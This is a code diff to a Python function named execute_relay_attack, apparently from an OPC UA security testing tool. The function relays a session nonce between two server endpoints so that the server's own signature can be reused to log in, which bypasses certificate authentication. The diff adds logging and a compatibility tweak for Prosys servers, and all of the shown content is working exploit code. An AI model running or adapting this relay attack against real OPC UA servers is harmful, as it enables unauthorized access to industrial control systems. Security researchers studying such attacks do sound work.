@@ -342,7 +342,7 @@ def execute_relay_attack(
     def csr(chan, client_ep, server_ep, nonce):
       return generic_exchange(chan, server_ep.securityPolicyUri, createSessionRequest, createSessionResponse, 
         requestHeader=simple_requestheader(),
-        clientDescription=client_ep.server,
+        clientDescription=client_ep.server._replace(applicationUri=applicationuri_from_cert(client_ep.serverCertificate)), # Prosys needs this.
         serverUri=server_ep.server.applicationUri,
         endpointUrl=server_ep.endpointUrl,
         sessionName=None,
@@ -353,10 +353,14 @@ def execute_relay_attack(
       )
 
     # Send CSR to login_endpoint, pretending we're imp_endpoint. Use arbitrary nonce.
+    log(f'Creating first session on login endpoint ({login_endpoint.endpointUrl})')
     createresp1 = csr(login_chan, imp_endpoint, login_endpoint, os.urandom(32))
     
     # Now send the server nonce of this channel as a client nonce on the other channel.
+    log(f'Got server nonce: {hexlify(createresp1.serverNonce)}')
+    log(f'Forwarding nonce to second session on impersonate endpoint ({imp_endpoint.endpointUrl})')
     createresp2 = csr(imp_chan, login_endpoint, imp_endpoint, createresp1.serverNonce)
+    log(f'Got signature over nonce: {hexlify(createresp2.serverSignature.signature)}')
     
     if createresp2.serverSignature.signature is None:
       raise AttackNotPossible('Server did not sign nonce. Perhaps certificate was rejected, or an OPN attack may be needed first.')
@@ -380,6 +384,7 @@ def execute_relay_attack(
       raise AttackNotPossible('Endpoint does not allow either anonymous or certificate-based authentication.')
     
     # Now activate the first session using the signature from the second session.
+    log(f'Using signature log in to {login_endpoint.endpointUrl}.')
     generic_exchange(login_chan, login_endpoint.securityPolicyUri, activateSessionRequest, activateSessionResponse, 
       requestHeader=simple_requestheader(createresp1.authenticationToken),
       clientSignature=createresp2.serverSignature,
